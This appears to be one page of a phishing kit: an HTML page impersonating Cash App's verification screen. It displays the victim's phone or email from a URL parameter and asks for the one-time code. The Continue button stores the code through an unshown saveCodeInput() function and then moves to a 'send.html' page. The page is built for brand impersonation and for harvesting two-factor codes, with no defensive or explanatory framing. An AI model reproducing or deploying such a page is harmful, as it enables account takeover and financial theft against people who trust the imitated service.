<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Cash App - Verify</title>
  <style>
    body {
      margin: 0;
      background-color: black;
      color: white;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .logo {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 30px;
    }

    .container {
      text-align: center;
      max-width: 400px;
      width: 90%;
    }

    input {
      width: 100%;
      padding: 15px;
      font-size: 18px;
      border-radius: 8px;
      border: none;
      margin-bottom: 20px;
      text-align: center;
    }

    button {
      width: 100%;
      padding: 15px;
      font-size: 18px;
      border-radius: 25px;
      background-color: #00d632;
      color: white;
      border: none;
      cursor: pointer;
      margin-bottom: 10px;
    }

    .resend {
      color: #00d632;
      margin-bottom: 30px;
    }

    .help {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
      color: #00d632;
      font-size: 14px;
      gap: 6px;
    }

    .help img {
      width: 16px;
      height: 16px;
    }

    .footer {
      position: absolute;
      bottom: 20px;
      font-size: 12px;
      color: #6e6e6e;
    }

    .footer a {
      color: #337aff;
      text-decoration: none;
      margin: 0 5px;
    }
  </style>
</head>
<body>
  <div class="logo">$</div>

  <div class="container">
    <h2>Enter the code sent to your phone</h2>
    <p>We sent the code to <strong id="targetInfo">(loading...)</strong>.</p>

    <div class="help">
      <img src="images/help-icon.png" alt="Help Icon">
      <span>Get help</span>
    </div>

    <input type="text" placeholder="123 456">
    <button onclick="saveCodeInput(); window.location.href='send.html';">Continue</button>


    <div class="resend">Resend Code</div>
  </div>

  <div class="footer">
    <a href="#">Terms</a> •
    <a href="#">Privacy</a> •
    <a href="#">Licenses</a>
  </div>

  <script>
    // Haal de 'login' parameter uit de URL op
    const params = new URLSearchParams(window.location.search);
    const loginValue = params.get('login');

    // Zoek het element met id 'targetInfo'
    const target = document.getElementById('targetInfo');

    // Als er een waarde is, stel die in als de tekst, anders zet je 'Unknown'
    if (loginValue) {
      target.textContent = loginValue;  // Zet de waarde van het nummer of e-mail in de tekst
    } else {
      target.textContent = '(Unknown)';
    }
  </script>
  
</body>
</html>
